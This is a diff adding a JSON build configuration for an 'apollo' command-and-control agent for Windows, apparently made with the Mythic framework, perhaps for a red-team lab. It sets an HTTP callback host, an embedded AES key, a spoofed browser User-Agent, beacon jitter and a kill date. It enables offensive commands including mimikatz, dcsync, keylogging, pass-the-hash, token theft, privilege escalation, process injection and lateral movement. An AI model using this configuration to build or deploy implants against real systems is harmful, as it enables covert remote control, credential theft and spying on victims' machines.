@@ -1,0 +1,135 @@
+{
+	"description": "Created by mythic_admin at 2025-10-27 00:39:37 Z",
+	"payload_type": "apollo",
+	"c2_profiles": [
+		{
+			"c2_profile": "http",
+			"c2_profile_is_p2p": false,
+			"c2_profile_parameters": {
+				"AESPSK": {
+					"dec_key": "eZZgONnhcxZmqXwY4Sd+j6nNtC389FE+GHo5q+aoA0c=",
+					"enc_key": "eZZgONnhcxZmqXwY4Sd+j6nNtC389FE+GHo5q+aoA0c=",
+					"value": "aes256_hmac"
+				},
+				"callback_host": "http://192.168.1.1",
+				"callback_interval": 3,
+				"callback_jitter": 23,
+				"callback_port": 80,
+				"encrypted_exchange_check": true,
+				"headers": {
+					"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+				},
+				"killdate": "2026-10-27",
+				"post_uri": "data",
+				"proxy_host": "",
+				"proxy_pass": "",
+				"proxy_port": "",
+				"proxy_user": ""
+			}
+		}
+	],
+	"build_parameters": [
+		{
+			"name": "output_type",
+			"value": "WinExe"
+		},
+		{
+			"name": "shellcode_format",
+			"value": "Binary"
+		},
+		{
+			"name": "shellcode_bypass",
+			"value": "Continue on fail"
+		},
+		{
+			"name": "adjust_filename",
+			"value": true
+		},
+		{
+			"name": "debug",
+			"value": false
+		}
+	],
+	"commands": [
+		"assembly_inject",
+		"blockdlls",
+		"cat",
+		"cd",
+		"cp",
+		"dcsync",
+		"download",
+		"execute_assembly",
+		"execute_coff",
+		"execute_pe",
+		"exit",
+		"get_injection_techniques",
+		"getprivs",
+		"getsystem",
+		"ifconfig",
+		"inject",
+		"inline_assembly",
+		"jobkill",
+		"jobs",
+		"jump_psexec",
+		"jump_wmi",
+		"keylog_inject",
+		"kill",
+		"link",
+		"listpipes",
+		"load",
+		"ls",
+		"make_token",
+		"mimikatz",
+		"mkdir",
+		"mv",
+		"net_dclist",
+		"net_localgroup",
+		"net_localgroup_member",
+		"net_shares",
+		"netstat",
+		"powerpick",
+		"powershell",
+		"powershell_import",
+		"ppid",
+		"printspoofer",
+		"ps",
+		"psinject",
+		"pth",
+		"pwd",
+		"reg_query",
+		"reg_write_value",
+		"register_assembly",
+		"register_coff",
+		"register_file",
+		"rev2self",
+		"rm",
+		"rpfwd",
+		"run",
+		"sc",
+		"screenshot",
+		"screenshot_inject",
+		"set_injection_technique",
+		"shell",
+		"shinject",
+		"sleep",
+		"socks",
+		"spawn",
+		"spawnto_x64",
+		"spawnto_x86",
+		"steal_token",
+		"ticket_cache_add",
+		"ticket_cache_extract",
+		"ticket_cache_list",
+		"ticket_cache_purge",
+		"ticket_store_add",
+		"ticket_store_list",
+		"ticket_store_purge",
+		"unlink",
+		"upload",
+		"whoami",
+		"wmiexecute"
+	],
+	"selected_os": "Windows",
+	"filename": "apollo-local.exe",
+	"wrapped_payload": ""
+}
